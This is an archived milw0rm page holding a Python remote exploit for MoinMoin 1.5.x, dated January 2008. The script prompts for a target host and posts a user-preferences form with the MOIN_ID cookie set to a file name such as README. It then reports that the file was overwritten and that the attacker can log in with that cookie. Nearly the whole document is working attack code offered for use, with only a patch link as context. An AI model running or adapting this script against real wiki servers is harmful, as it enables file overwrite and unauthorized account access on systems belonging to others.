<html><head><title>MoinMoin 1.5.x MOIND_ID cookie Bug Remote Exploit</title></head><pre>#!/usr/bin/python
#
#Exploit for the MOIND_ID cookie Bug
# MoinMoin 1.5.x
#
#Find your patch in : http://hg.moinmo.in/moin/1.5/rev/e69a16b6e630
#
#Bug and exploit coded by just a nonroot and colombian user
#
#Enero 21 de 2008
#
#Greets: el directorio and all the SL community
#
# 
import urllib2,sys
print &quot;MoinMoin host: i.e: http://127.0.0.1:8000/&quot;
host=raw_input(&quot;MoinMoin host ( include http and /): &quot;)
#info for the new user
#
#user for the test
user='nonroot'
#password for the test
password='nonrootuser'
#email for the test
email='just@nonrootuser.co'
#file to overwrite
#by default this file is there, is there?
archivo='README'
#######
#
req = urllib2.Request(host) 
adddata=&quot;action=userform&amp;name=&quot;+user+&quot;&amp;aliasname=ilikecolombianpeople&amp;password=&quot;+password+&quot;&amp;password2=&quot;+password+&quot;&amp;email=&quot;+email+&quot;&amp;css_url=&amp;edit_rows=20&amp;theme_name=modern&amp;editor_default=text&amp;editor_ui=freechoice&amp;tz_offset=0&amp;datetime_fmt=&amp;language=&amp;remember_me=1&amp;show_fancy_diff=1&amp;show_toolbar=1&amp;show_page_trail=1&amp;quicklinks=podriamos-insertar-codigo-php-aqui-verdad-que-si&amp;save=Save&quot;
headers={'Cookie':'MOIN_ID='+archivo}
req = urllib2.Request(host+&quot;UserPreferences/&quot;,adddata,headers) 
try:
	r = urllib2.urlopen(req)
	data=r.read()
except	urllib2.HTTPError:
	print &quot;Wait a minute, is posible that the file: &quot;+archivo+&quot; doesn't have permission to write, think well, and try again&quot;
	sys.exit(2)
print &quot;Ok, the file: &quot;+archivo+&quot; was created, and you can logging setting the cookie MOIN_ID='&quot;+archivo+&quot;'&quot;+&quot; in your browser.&quot;
sys.exit(0)

# milw0rm.com [2008-01-21]</pre></html>